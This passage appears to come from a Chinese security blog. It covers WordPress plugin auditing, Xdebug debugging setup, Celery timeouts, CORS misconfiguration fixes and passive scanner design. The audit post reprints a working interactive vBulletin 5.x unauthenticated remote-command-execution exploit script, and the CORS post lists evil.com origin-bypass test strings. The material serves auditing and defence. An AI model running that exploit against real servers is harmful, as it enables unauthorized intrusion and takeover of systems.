&lt;?php $wpdb-&gt;hide_errors(); ?&gt; 
&lt;?php $wpdb-&gt;print_error(); ?&gt;
</code></pre>
</div>

<h3 id="任意文件下载">任意文件下载</h3>

<p>可疑函数，雷同于普通审计：</p>

<ul>
  <li>file()</li>
  <li>readfile()</li>
  <li>file_get_contents()</li>
</ul>

<h3 id="文件包含">文件包含</h3>

<p>可疑函数，雷同于普通审计：</p>

<ul>
  <li>include()</li>
  <li>require()</li>
  <li>include_once()</li>
  <li>require_once()</li>
  <li>fread()</li>
</ul>

<h3 id="文件删除">文件删除</h3>

<p>可疑函数，雷同于普通审计：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>unlink() 任意删除文件
</code></pre>
</div>

<h3 id="文件上传">文件上传</h3>

<div class="highlighter-rouge"><pre class="highlight"><code>sanitize_file_name() 可以创建有效的php文件, 把test.(php)转为test.php
</code></pre>
</div>
<p>一般情况下，wordpress自带的编辑器上传一般是做了校验的，如果不是的话，可以尝试fuzz一下。
另外，在超管权限下是可以直接编辑模板拿shell或者传插件的，这个需要在服务器上配置限制修改和上传的权限。</p>

<h3 id="反序列化漏洞">反序列化漏洞</h3>

<blockquote>
  <p>unserialize() any raw user input passed to this function is probably exploitable, if serialized() first, probably not vulnerable</p>
</blockquote>

<p>一般来说，利用PHP的反序列化漏洞，一般要注意几点：</p>

<ul>
  <li>phar文件要能够上传到服务器端。</li>
  <li>要有可用的魔术方法作为“跳板”。</li>
  <li>文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。</li>
  <li>输入参数值反序列化后，其本身的结果，可以直接触发提权动作。</li>
  <li>一般主分支难以找到反序列化利用点，所以要尝试在插件的类去找可以利用的魔术方法。</li>
</ul>

<p>具体可以参考：</p>

<ul>
  <li><a href="https://paper.seebug.org/680/#32-wordpress">利用 phar 拓展 php 反序列化漏洞攻击面【wordpress】</a></li>
  <li><a href="https://www.freebuf.com/vuls/198913.html"> WordPress插件Easy WP SMTP反序列化漏洞分析</a></li>
</ul>

<h3 id="插件辅助判断">插件辅助判断</h3>

<p>在反序列化之前先进行序列化，会有一定的防治作用，有款wordpress插件提供可反序列化的类，和配套的burp插件可以验证漏洞的存在：</p>

<ul>
  <li><a href="https://www.pluginvulnerabilities.com/2017/07/24/wordpress-plugin-for-use-in-testing-for-php-object-injection/">wordpress插件分析</a></li>
  <li><a href="https://www.pluginvulnerabilities.com/wp-content/uploads/2017/07/php-object-injection-test.zip">wordpress插件下载</a></li>
  <li><a href="https://gist.github.com/ethicalhack3r/7c2618e5fffd564e2734e281c86a2c9b">配套burp插件</a></li>
</ul>

<p>大致核心代码如下，稍微解释下，类的__wakeup()方法（*PHP“魔术方法”，unserialize()函数会检查是否存在__wakeup()，如果存在，则会先调用__wakeup()方法，预先准备对象需要的资源），如果一个类定义了__wakeup()方法，那么无论何时该类的某个对象使用了unserialize()函数进行反序列化都能保证__wakeup()方法一定被调用：</p>
<div class="highlighter-rouge"><pre class="highlight"><code>&lt;?

class PHP_Object_Injection {
   function __wakeup() {
		exit('PHP object injection has occurred.');
   }
}

?&gt;
</code></pre>
</div>
<p>burp插件在检测到关键词时（PHP object…occurred）,会提示检测到漏洞。</p>

<h3 id="命令执行">命令执行</h3>

<p>可疑函数，雷同于普通审计：</p>
<ul>
  <li>system()</li>
  <li>exec()</li>
  <li>passthru()</li>
  <li>shell_exec()</li>
</ul>

<h3 id="代码执行">代码执行</h3>

<p>可疑函数，雷同于普通审计：</p>
<ul>
  <li>eval()</li>
  <li>assert()</li>
  <li>preg_replace() dangerous “e” flag deprecated since PHP &gt;= 5.5.0 and removed in PHP &gt;= 7.0.0.</li>
</ul>

<h3 id="任意url跳转">任意url跳转</h3>

<p>系统自带的跳转函数，本身没做检查，需要插件作者自行做过滤，否则会存在任意url跳转的风险。</p>

<div class="highlighter-rouge"><pre class="highlight"><code>wp_redirect()
</code></pre>
</div>

<h3 id="csrf利用nonce">CSRF（利用nonce）</h3>

<p>在wordpress中，主要用自带的nonce作为token来防治csrf，当然也有过插件作者自造token的。</p>

<p>另外值得一提的是，wordpress的评论机制似乎对csrf没有防御。</p>

<p>在nonce检查中，不是每一步都检查权限的。实际代码跨越了多个文件和函数调用，因此这个过程很容易出现这种缺陷，示例见：
<a href="https://xz.aliyun.com/t/3659">WordPress权限提升漏洞分析
</a></p>

<p>下面是对csrf攻击的防御：</p>

<ul>
  <li>wp_nonce_field() csrf token加入表单</li>
  <li>wp_nonce_url() csrf token加入url</li>
  <li>wp_verify_nonce() 服务端需要验证csrf token</li>
  <li>check_admin_referer() server端检查是否来自admin权限页面【笔者觉得比较鸡肋】</li>
</ul>

<p>另外，有人提过nonce可以抑制SSRF的产生。</p>

<h3 id="wordpress权限认证绕过">wordpress权限认证绕过</h3>

<p>由于WordPress中的AJAX动作是通过wp-admin/admin-ajax.php文件访问的，所以is_admin()总是返回true。</p>

<p>官方说法：</p>

<blockquote>
  <p>Whether the current request is for an administrative interface page. […] Does not check if the user is an administrator; current_user_can() for checking roles and capabilities.</p>
</blockquote>

<h3 id="可用攻击向量">可用攻击向量</h3>

<p>下面的函数本来是无害的，它们一般会用于构造利用链，做wordpress权限提升。如果没有过滤完全，会比单纯输出打印内容更富有威胁性。</p>

<ul>
  <li>update_option() 输入未严格验证的时候，可能会触发wordpress的option的更新。</li>
  <li>do_action() 输入未严格验证的时候，会触发wordpress代码执行。</li>
  <li>add_action 触发函数钩子。</li>
</ul>

<h3 id="第三方信任源和自带后门">第三方信任源和自带后门</h3>

<p>第三方信任源的问题，主要可能是对第三方网站内容的加载，没有进行合适过滤。</p>

<p>而插件自带后门，可能会存在硬编码，或者缺少权限验证/权限混乱的问题。通过审计代码，黑客可以直接获取网站权限。比如最近vBulletin 5.x的rce【这里没有现成的wp插件举例，大家将就下】：</p>

<div class="highlighter-rouge"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="s">"Usage: </span><span class="si">%</span><span class="s">s &lt;URL to vBulletin&gt;"</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>

<span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s">"routestring"</span><span class="p">:</span><span class="s">"ajax/render/widget_php"</span><span class="p">}</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
     <span class="k">try</span><span class="p">:</span>
          <span class="n">cmd</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">"vBulletin$ "</span><span class="p">)</span>
          <span class="n">params</span><span class="p">[</span><span class="s">"widgetConfig[code]"</span><span class="p">]</span> <span class="o">=</span> <span class="s">"echo shell_exec('"</span><span class="o">+</span><span class="n">cmd</span><span class="o">+</span><span class="s">"'); exit;"</span>
          <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">data</span> <span class="o">=</span> <span class="n">params</span><span class="p">)</span>
          <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
               <span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>
          <span class="k">else</span><span class="p">:</span>
               <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="s">"Exploit failed! :("</span><span class="p">)</span>
     <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
          <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Closing shell..."</span><span class="p">)</span>
     <span class="k">except</span> <span class="nb">Exception</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
          <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
</code></pre>
</div>

<p>从poc来看，这里的利用方式是不需要认证的，直接通过post参数组，传入恶意代码，即可执行命令。
对于这个后门是否为官方故意所为，笔者不好下定论，但这种漏洞确实不少见。
早些年笔者挖掘cve时就曾遇到过，那还是个有几十万用户量的wordpress插件。</p>

<h3 id="后记">后记</h3>

<p>对于cve漏洞挖掘，还是需要耐心和细心的。毕竟流程复杂的漏洞不好挖，简单的漏洞大部分被人挖过了，尤其是被人怼了个通透的大型开源CMS。</p>

<p>一般白盒和黑盒挖掘需要结合，Fuzz和审计都是有用的。</p>

<p>通过分析语法树，以及动态hook的法子，也越来越被推广使用。</p>

<p>举例说，如果尝试梳理长语法树和调用链，无论是注重深度还是注重广度，一般都需要较高内存机器去跑，说实话耗费资源是不低的。</p>

<p>而一旦这块儿做好了以后，就算我们不一定能主动发现新漏洞。但除了漏洞公告后，我们通过调用链回溯diff出来的点，一般我们都能很快地去定位到可用的漏洞利用链，说不定还有意外惊喜。</p>

<h3 id="文章参考">文章参考</h3>

<ul>
  <li><a href="https://github.com/WordPress/WordPress-Coding-Standards">wordpress编码标准</a></li>
  <li><a href="https://www.fortinet.com/blog/threat-research/wordpress-plugin-sql-injection-vulnerability.html">Multiple WordPress Plugins SQL Injection Vulnerabilities</a></li>
  <li><a href="https://xz.aliyun.com/t/4438">评论处wp_filter_post_kses过滤不全</a></li>
  <li><a href="https://xz.aliyun.com/t/6395">渲染导致的HTML实体编码失效</a></li>
  <li><a href="https://xz.aliyun.com/t/2643">使用grep检查wp-sec</a></li>
  <li><a href="https://xz.aliyun.com/t/1482">$wpdb-&gt;prepare的修复和正确使用</a></li>
  <li><a href="https://xz.aliyun.com/t/2150">PHP反序列化与Wordpress一些意外Bug的有趣结合</a></li>
  <li><a href="https://github.com/ethicalhack3r/wordpress_plugin_security_testing_cheat_sheet">wordpress插件安全文档</a></li>
</ul>
]]></content>
      <categories>
        
          <category> vuln </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[xdebug+phpstorm+phpstudy本地调试踩坑]]></title>
      <url>/vuln/2019/10/10/xdebug-phpstorm-phpstudy/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#00B050;"><strong>这两天用idea审java比较顺手，顺便也迁移了下php调试环境，从vscode迁移到jetbrains家的phpstorm。以前习惯了纯搜索字符串，通过打印调试，没有动态hook变量看起来比较费劲。迁移过程中遇到一些坑，故此记录一下。
</strong></span>
</p>

<h3 id="phpstorm配置">phpstorm配置</h3>

<p>先贴下我自己的php.ini配置【XDebug部分】：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>[XDebug]
xdebug.profiler_output_dir="D:\phpstudy_pro\Extensions\tmp\xdebug"
xdebug.trace_output_dir="D:\phpstudy_pro\Extensions\tmp\xdebug"
zend_extension="D:\phpstudy_pro\Extensions\php\php_xdebug-2.2.5-5.6-vc11-nts-x86_64.dll"
xdebug.remote_port = 9000
xdebug.remote_autostart= On
xdebug.remote_enable = On
xdebug.idekey = phpstorm-xdebug
xdebug.remote_handler = "dbgp"
xdebug.remote_host = "127.0.0.1"
</code></pre>
</div>
<h3 id="前人踩坑总结">前人踩坑总结</h3>

<p>中间遇到一个坑，网上大部分配置操作都照做了。</p>

<p>这里着重讲几个重要的配置，跟下面网上扒拉的图不大一致【由于没找到合适的图床，暂时只能引用网上的】：</p>

<p>顶栏点击File-&gt;Settings，搜索框输入debug，ideakey是我自己设置的<strong>phpstorm-xdebug</strong>：</p>

<p><img src="http://www.pianshen.com/images/875/e473bbd1c2ba3874beb5b2c1be586e3b.png" alt="image" /></p>

<p>下图是网图，我设置的是<strong>9000</strong>：</p>

<p><img src="http://www.pianshen.com/images/213/403b3aca2b50f4b3529c098af21b19f5.png" alt="image" /></p>

<p>因为是本地映射调试，下面网图的Use path mappings不要勾选，但填不填域名关系不大，我自己填的<strong>127.0.0.1</strong>：</p>

<p><img src="http://www.pianshen.com/images/497/bcad8b94b1ec8f582f0d14a176a0f439.png" alt="image" /></p>

<p>注意，最新版的phpstorm下面不是web application，而是<strong>web page</strong>：</p>

<p><img src="http://static.oschina.net/uploads/space/2014/1128/150910_uD44_174025.png" alt="image" /></p>

<h3 id="设置cli-interpreter">设置CLI Interpreter</h3>

<p>设置链路为：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>Settings-&gt;Languages&amp;Frameworks-&gt;PHP
</code></pre>
</div>

<p>设置为你引用的php.exe绝对路径即可，另外该页面的Include Path按默认的就好。</p>

<h3 id="文件映射map报错可以看变量无法跟踪文件">文件映射map报错，可以看变量，无法跟踪文件</h3>

<p>记得在调试variables的时候，映射本地路径的时候，会要求<strong>做文件夹路径映射</strong>，否则会报错，提示map错误，无法定位跟踪需要调试的文件。</p>

<h3 id="phpstorm-interpreter无法拦截">PHPStorm Interpreter无法拦截</h3>

<p>另外，还有个大坑就是，在配置时遇到interpreter无法拦截：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>PHPStorm报错：Cannot accept external Xdebug connection: Cannot evaluate expression'isset($_SERVER['PHP_IDE_CONFIG'])';
</code></pre>
</div>

<p>我看了下网上的说法，PHPStorm这个报错，是因为对于xdebug，zend_extension和extension不能同时启用，否则拦截启用不了（vscode似乎不受影响，我测的时候是可以拦截的）。</p>

<p>导致此问题的一个可能原因是：服务器端的php.ini中配置了：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>extension=/path/xdebug.dll
</code></pre>
</div>

<p>应该只保留下面一个，而且zend_extension需要绝对路径，extension不需要（至少win下是如此）：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>zend_extension=/path/xdebug.dll
</code></pre>
</div>

<p>原文是xdebug.so，按理说win下应该改成xdebug.dll，网上答案全tm爬虫抄的。</p>

<p>这里我受了误导，耽误了很长时间。因为我发现，鄙人在win下的php.ini针对xdebug，只配置了zend_extension，并没有如网上所述去设置extension。</p>

<p>那么为什么还会出现这种情况呢？</p>

<p>后来终于想明白了，最开始，我在phpstudy界面自己加载了扩展，当时就直接：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>网站-&gt;管理-&gt;PHP扩展-&gt;勾选php_xdebug
</code></pre>
</div>

<p>但是这里的配置，我所使用的php版本的php.ini里是看不到的，也许是引用的全局配置，具体在哪儿我没搞明白。</p>

<p>反正因为这个重复了，但是vscode没有影响，在PHPStorm就直接无法拦截了。</p>

<p>当我<strong>取消勾选</strong>这里的<strong>xdebug扩展（php_xdebug）</strong>时，问题就解决了。</p>

<h4 id="xdebug下断点超时">xdebug下断点超时</h4>

<p>在调试的时候，看着看着variables突然就没了，回网页一看，结果发现页面超时500。
尝试修改php.ini的超时配置，并没有卵用：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>max_execution_time=600
</code></pre>
</div>
<p>然后尝试直接在Apache（或者其他webserver）里做配置，成功解决超时问题：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>FcgidIOTimeout 3600
</code></pre>
</div>

<p>QA:</p>
<div class="highlighter-rouge"><pre class="highlight"><code>明天试试在引用处下断点，因为多空间引用可能走不到那一点，超时问题咋解决?
</code></pre>
</div>

<h3 id="参考资料">参考资料</h3>

<p><a href="http://www.pianshen.com/article/7930277434/">《waiting for incoming connetcion with ide key 17142 问题解决
》</a></p>

<p><a href="http://ju.outofmemory.cn/entry/331038">《MAMP 与 PhpStorm 远程调试
》</a></p>

<p><a href="https://www.jb51.net/article/128545.htm">《使用PHPStorm+XDebug搭建单步调试环境》</a></p>

<p><a href="https://blog.csdn.net/yizhou35/article/details/17043925">《PHP Warning: Xdebug MUST be loaded as a Zend extension in Unknown on line 0 解决办法》</a></p>

<p><a href="https://blog.csdn.net/universee/article/details/74516250">《PhpStorm和WAMP配置调试参数，问题描述Error. Interpreter is not specified or invalid. Press “Fix” to edit your pro》</a></p>

<p><a href="https://www.cnblogs.com/yjken/p/6555438.html">《phpstorm中配置真正的远程调试(xdebug)》</a></p>

]]></content>
      <categories>
        
          <category> vuln </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[celery超时机制小结]]></title>
      <url>/coding/2019/10/08/celery-timeout-tips/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#DAA520;"><strong>以前在使用celery任务时，老是被其超时机制不奏效所困扰，没有一个比较完美的解决方案。前两天琢磨出新的方案，故此借机梳理下过往细节。</strong></span>
</p>

<h3 id="自带超时机制">自带超时机制</h3>

<p>首先，celery是自带超时机制的，主要分两种：</p>

<h4 id="软超时soft_time_limit">软超时（soft_time_limit）</h4>

<div class="highlighter-rouge"><pre class="highlight"><code>@celery.task(soft_time_limit=360)
def soft_time_out_try(args,url_array):
    pass
</code></pre>
</div>

<p>在这种情况下，就算超时了，也是平滑过渡不会报错，推荐优先考虑。</p>

<p>但是这种情况有个问题，在该机制下，如果函数中含有容易超时的第三方模块，是可能存在软超时以后，任务继续卡住的情况的。</p>

<p>笔者在测试时使用的是celery v3，在升级v4后暂时没遇到这种情况。</p>

<h4 id="硬超时time_limit">硬超时（time_limit）</h4>

<div class="highlighter-rouge"><pre class="highlight"><code>@celery.task(time_limit=40)
def hard_time_out_try(args,url_array):
    pass
</code></pre>
</div>
<p>在此情况下，超时阻断效果很给力，基本不会出现卡住的情况下。</p>

<p>但是这种模式会直接抛出异常，不是特别友好。</p>

<p>另外，在chord和group之类等聚合链路模式下，如果单个链路超时，会直接导致整体聚合失败，不会得到最终结果，也调用不了callback，比如下面的<strong>chord_return_value</strong>函数：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>results = chord( (hard_time_out_try_single.s(path, PASSWORD_DIC, host, port) for port in service_ports for path in plugin_www_paths ), chord_return_value.s(sys._getframe().f_code.co_name , url) )().get()

</code></pre>
</div>

<h3 id="自定义超时机制">自定义超时机制</h3>

<p>如果celery自带的超时机制不能满足需求，我们可以尝试去构造监控，采用双保险避免模块超时。</p>

<h4 id="双保险之软超时优先">双保险之软超时优先</h4>

<p>先采用<strong>time_limit</strong>进行最有效的阻断，再采用<strong>soft_time_limit</strong>去处理抛出的错误。</p>

<p>这样的话，<strong>优点</strong>在于可以比较平滑的过度，适用于chord之类的聚合不会报错，<strong>缺点</strong>在于会平白增加许多额外的task，会消耗更多人力和机器资源。</p>

<p>具体案例如下（celery v3有时还是会出问题，celery v4未尝试）：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>@celery.task(soft_time_limit=120)
def hard_time_out_try_pre(path, PASSWORD_DIC, host, port):
    try:
        result= hard_time_out_try_single.apply_async( args=(path, PASSWORD_DIC, host, port) )
        while True:
            if result.ready() or result.status == "Failed":
                break
        r = result.get()
        return r

    except Exception,e:
        print e
        
@celery.task(time_limit=100)
def soft_time_out_try(args,url_array):
    pass

</code></pre>
</div>

<h4 id="双保险之硬超时优先">双保险之硬超时优先</h4>

<p>跟前面不同，这里优点在于比较保险地杀死超时函数，没有一开始就直接武断的使用time_limit，而带有一定的缓冲效果。</p>

<p>当然，这里是不太适用于chord之类需要结果聚合的场景。</p>

<p>简单解释下，TimeLimitExceeded会直接杀掉进程，raise一个TimeLimitExceeded，不能被 task捕捉，所以应该两种方案配合使用，<strong>soft_time_limit</strong>=小int，<strong>time_limit</strong>=大int，使用soft试图关闭进程超时就会被干掉。</p>

<div class="highlighter-rouge"><pre class="highlight"><code>from celery.exceptions import SoftTimeLimitExceeded

@celery.task
def mytask():
    try:
        return time_out_try_single()
    except SoftTimeLimitExceeded:
        cleanup_in_a_hurry()
</code></pre>
</div>

<h4 id="使用信号处理遏制函数超时">使用信号处理，遏制函数超时</h4>

<p>具体流程如下，尝试了对遏制函数超时比较有效，暂时没发现副作用。</p>

<p>但这里没能再次复现第三方模块超时的场景，后续如若遇到相应情况不能解决，会继续更新其他解决方案，具体流程如下：</p>

<ul>
  <li>调用<strong>time_out_try_single</strong>函数进行超时监控，使用sleep模拟函数执行超时</li>
  <li>引入signal模块，设置handler捕获超时信息，返回断言错误</li>
  <li>alarm(120)，设置120秒闹钟，函数调用超时120秒则直接返回</li>
  <li>捕获异常，打印超时信息。</li>
</ul>

<div class="highlighter-rouge"><pre class="highlight"><code>import time
import signal

def time_out_try_single(i):
    time.sleep(i%4)
    print "%d within time"%(i)
    return i

if __name__ == '__main__':
    def handler(signum, frame):
        raise AssertionError

    i = 0
    for i in range(1,10):
        try:
            signal.signal(signal.SIGALRM, handler)
            signal.alarm(120)
            time_out_try_single(i)
            i = i + 1
            signal.alarm(0)
        except AssertionError:
            print "%d timeout"%(i)
</code></pre>
</div>

<h3 id="参考文档">参考文档</h3>

<p><a href="http://docs.celeryproject.org/en/latest/userguide/configuration.html#std:setting-task_time_limit">《setting-task_time_limit》</a></p>

<p><a href="https://www.jianshu.com/p/5a969b067ce6">《hard杀死soft》</a></p>

<p><a href="http://blog.sina.com.cn/s/blog_63041bb80102uy5o.html">《Python设置函数调用超时》</a></p>

]]></content>
      <categories>
        
          <category> coding </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[cors漏洞之123]]></title>
      <url>/vuln/2019/09/28/cors-tips/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#00B050;"><strong>cors漏洞相信大家已经很熟悉了，一般会用于配合csrf漏洞对用户进行攻击。这里就遇到的一些case，简单讲讲可能漏报误报的点，以及相应的修复方案。
</strong></span>
</p>

<h3 id="cors漏洞要素">cors漏洞要素</h3>

<p>cors漏洞成功主要需要两个点，</p>

<p>在Html Response头部里面：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>Access-Control-Allow-Origin: http://www.whitedomain.com
Access-Control-Allow-Origin: true or false
</code></pre>
</div>
<p>或者同时具备：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: false
</code></pre>
</div>
<p>Credentials这里是比较容易被忽略的，Credentials为false的话，数据包是不会带上<strong>传统的认证信息</strong>，你获取到的敏感内容也是相对有限的。</p>

<p>另外，cors漏洞也需要注意一点，你在构造测试点的时候，需要得到：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>Origin: http://www.whitedomain.com
</code></pre>
</div>
<p>这里的域名是不能带上目录的，因为你实际上构造钓鱼页面的时候，是无法构造畸形Origin的。</p>

<p>为啥呢，因为你从页面发送给后端的请求，浏览器会主动去解析过滤，如果在这里去构造畸形的域名，他会只取到host部分，不会处理目录，然后拿去给后端解析。</p>

<p>比如说，浏览器会像下面这样处理去取host，由于需要配合通用后端过滤设置，需要www.whitedomain.com结尾的绕过尝试：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>http://www.evil.com/whitedomain.com ===&gt; 
www.evil.com
http://www.evil.com\.whitedomain.com ===&gt; 
www.evil.com
http://www.evil.com#www.whitedomain.com ===&gt; 
www.evil.com
http://www.evil.com?www.whitedomain.com ===&gt; 
www.evil.com 

</code></pre>
</div>
<p>大概举几个例子就行，反正我这边暂时没找到可以绕过的尝试，后缀whitedomain.com，搞出来基本上取出来的真正host，也只能是whitedomain.com。</p>

<p>这是啥意思呢？意思是你去构造畸形的域名，浏览器可能就直接过滤拦截了。
传到后端的，基本就是你想要构造的恶意目的域名。这时候，后端做好相应的防跨域配置和服务器配置，基本就可以稳定拦截了。</p>

<h3 id="修复方法">修复方法</h3>

<p>java后端配置举例（jetty版本）：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>public FilterRegistrationBean crossFilter()
{
FilterRegistrationBean registration = new FilterRegistrationBean();
registration.setFilter(new org.eclipse.jetty.servlets.CrossOriginFilter() );
registration.addInitParameter(name: "allowOrigins", value: "*.whitedomain.com");
registration.addInitParameter(name: "allowMethods", value: "GET,POST,HEAD");
registration.addInitParameter(name: "allowHeaders", value: "X-Requested-With,Content-Type,Accept,Origin");
registration.addUrlPatterns("/*");
registration.setName("cross-origin");
return registration;
}
</code></pre>
</div>

<p>需要在pom.xml里配置的话:</p>

<div class="highlighter-rouge"><pre class="highlight"><code>&lt;web-app&gt;

    &lt;filter&gt;
        &lt;filter-name&gt;cross-origin&lt;/filter-name&gt;
        &lt;filter-class&gt;org.eclipse.jetty.servlets.CrossOriginFilter&lt;/filter-class&gt;
    &lt;/filter&gt;
    &lt;filter-mapping&gt;
        &lt;filter-name&gt;cross-origin&lt;/filter-name&gt;
        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
    &lt;/filter-mapping&gt;

&lt;/web-app&gt;
</code></pre>
</div>

<p>当然，如果遇到特殊情况，需要在前端直接配置，nodejs配置举例：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>// 判断origin是否在域名白名单列表中

function isOriginAllowed(origin, allowedOrigin) {

if (_.isArray(allowedOrigin)) {

for(let i = 0; i &lt; allowedOrigin.length; i++) {

if(isOriginAllowed(origin, allowedOrigin[i])) {

return true;

}

}

return false;

} else if (_.isString(allowedOrigin)) {

return origin === allowedOrigin;

} else if (allowedOrigin instanceof RegExp) {

return allowedOrigin.test(origin);

} else {

return !!allowedOrigin;

}

}

const ALLOW_ORIGIN = [ // 域名白名单

'*.whitedomain.com',

];

app.post('/formdata', function (req, res, next) {

let reqOrigin = req.headers.origin; // request响应头的origin属性

// 判断请求是否在域名白名单内

if(isOriginAllowed(reqOrigin, ALLOW_ORIGIN)) {

// 设置CORS为请求的Origin值

res.header("Access-Control-Allow-Origin", reqOrigin);

//个人觉得下面一句根据业务而定，可设定可不设定。
res.header('Access-Control-Allow-Credentials', 'true');

// 你的业务代码逻辑代码 ...

// ...

} else {

res.send({ code: -2, msg: '非法请求' });

}

});
</code></pre>
</div>

]]></content>
      <categories>
        
          <category> vuln </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[浅谈被动漏扫思路]]></title>
      <url>/scanner/2019/08/15/axe-scanner-design/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#DAA520;"><strong>本文中的规则分析，大部分来自于以前被动漏扫研发的实践，以后会再接触更多业务后，会继续进行更新。其中如有纰漏或者差错，希望诸位给出修正意见。
</strong></span>
</p>

<h3 id="sql注入">SQL注入</h3>
<p>对于SQLI注入，可以使用sqlmapapi进行检测。</p>

<p>优点在于，对于一些带回显和延时注入，企业内部检测没有waf拦截，会较为准确的定位。</p>

<p>缺点在于，对于这类检测，由于属于大规模扫描，一般会采用level和risk为初级的检测。当注入所需条件比较苛刻时，可能会覆盖不全，造成遗漏。</p>

<h3 id="xss">XSS</h3>
<p>对于XSS的检测的话，已经解决的有两个点，是针对反射性XSS和DOM型XSS的检测。</p>

<p>以前对awvs一类的扫描器做过调研，通常是用变形的常用的payload去fuzz，检测效率是比较低的，也容易被拦截。</p>

<p>针对反射性XSS（包含POST型存储XSS），采用的是检测部分特殊字符，两两成对，如果未曾过滤再去借助专门的XSS扫描器进行扫描，可尝试的字符如下：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>'
"
&lt; 
&gt; 
/
</code></pre>
</div>

<p>其实还可以做二次复检，加入敏感html标签再次尝试。这样检测成本提高不多，但会更准确一些。</p>

<p>对于DOM型XSS检测，提供有两种方案：</p>

<ul>
  <li>采用守护进程的方式去利用headless浏览器来hook渲染，从而检测出漏洞。
不过这种耗时比较长，有时候也因为浏览器渲染失败，以及同时发包量过大，导致内存崩溃漏掉部分漏洞。</li>
  <li>采用类phamtomjs的引擎，直接增改数据包参数，像检测反射性XSS那样加入特殊字符，通过Ajax方式发送数据包，挨个去检测对比返回值。</li>
</ul>

<p>针对存储型XSS，主要存在一个痛点，返回的页面不一定是输出XSS的点，那我们应该怎么办呢？</p>

<p>个人有个想法，我们可以通过数据库临时表记录下每个打了暗桩的post数据包，通过md5生成的是随机的值，我们可以采用这两种写法：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>A = payload+定位符+md5
B = 特殊字符+定位符+md5
</code></pre>
</div>

<p>然后在抓到的后续访问数据包中，如果response含有完整的A或者B，我们可以通过标记去寻找回溯存储型XSS的源头。</p>

<p>但有人可能会说了，你这随意下暗桩，搞得满站都是垃圾数据怎么办？</p>

<p>以前笔者就遇到过几次众测，个别人坏了规矩，登录后拿着扫描器一顿扫，搞得每个页面都在弹窗。</p>

<p>当然这个问题sqlmap等工具也是存在的，但这跟工具本身没关系，是设计和用途的问题。</p>

<p>这就需要业务扫描平台去做去重规则和黑名单限制了。</p>

<h3 id="越权漏洞">越权漏洞</h3>

<p>越权漏洞本身是不太好全自动化检测的，但我们可以做一些半自动化的工作，比如：</p>
<ul>
  <li>配置多组关键参数对，交替去替换原request中的参数对，看是否会有关键的差异response返回。</li>
  <li>采用混淆过的或者置空的cookie，看看返回数据是否与原response相同。</li>
</ul>

<h3 id="敏感文件泄露">敏感文件泄露</h3>

<p>在web目录可能会存在敏感配置文件或者临时文件，我们需要去通过黑盒探测，做好防治工作。</p>

<p>我们可以采用关键词命中、状态码命中、header命中等方式，多维度进行判断和探测，正确率会相对较高。</p>

<p>目前已经有部分开源扫描器采用了这种方式，可以直接调用或者模拟使用它们的规则。</p>

<h3 id="命令执行漏洞">命令执行漏洞</h3>

<p>命令执行的判定主要是通过以下几种方式：</p>
<ul>
  <li>通过回显，直接判断有没有读取到文件。</li>
  <li>通过dns服务器，判断有无读取到漏洞主机的请求。</li>
  <li>通过server反馈时差，判断是否执行了sleep。</li>
